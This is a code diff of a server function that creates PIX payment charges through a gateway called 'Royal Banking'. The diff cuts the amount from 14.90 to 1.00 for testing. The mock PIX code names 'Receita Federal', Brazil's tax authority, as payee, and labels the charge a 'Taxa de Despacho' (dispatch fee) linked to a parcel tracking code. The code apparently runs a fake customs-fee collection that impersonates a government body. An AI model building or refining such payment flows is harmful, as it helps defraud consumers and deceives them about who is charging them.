@@ -48,12 +48,12 @@ serve(async (req) => {
     if (!apiKey) {
       console.warn("ROYALBANKING_API_KEY não configurada. Utilizando modo simulado.");
       const mockId = "mock_" + Date.now();
-      const mockPix = "00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-426614174000520400005303986540514.905802BR5913Receita Federal6008Brasilia62140510TAXA1234566304A1B2";
+      const mockPix = "00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-42661417400052040000530398654051.005802BR5913Receita Federal6008Brasilia62140510TAXA1234566304A1B2";
       
       await supabase.from('pix_gateway_payments').upsert({
         id_transaction: mockId,
         status: 'pending',
-        raw_payload: { trackingCode, pix: mockPix, amount: 14.90, description: "Taxa de Despacho" }
+        raw_payload: { trackingCode, pix: mockPix, amount: 1.00, description: "Taxa de Despacho" }
       });
       
       return new Response(JSON.stringify({ success: true, pixCopiaECola: mockPix, idTransaction: mockId }), {
@@ -62,10 +62,10 @@ serve(async (req) => {
       });
     }
 
-    // Chamada REAL da API Royal Banking
+    // Chamada REAL da API Royal Banking (Atualizado para 1.00 real de teste)
     const payload = {
       "api-key": apiKey,
-      "amount": 14.90,
+      "amount": 1.00,
       "client": {
         "name": clientName,
         "document": clientDoc,
@@ -95,7 +95,7 @@ serve(async (req) => {
     await supabase.from('pix_gateway_payments').upsert({
       id_transaction: idTransaction,
       status: 'pending',
-      raw_payload: { trackingCode, pix: pixCopiaECola, amount: 14.90 }
+      raw_payload: { trackingCode, pix: pixCopiaECola, amount: 1.00 }
     });
 
     return new Response(JSON.stringify({ 
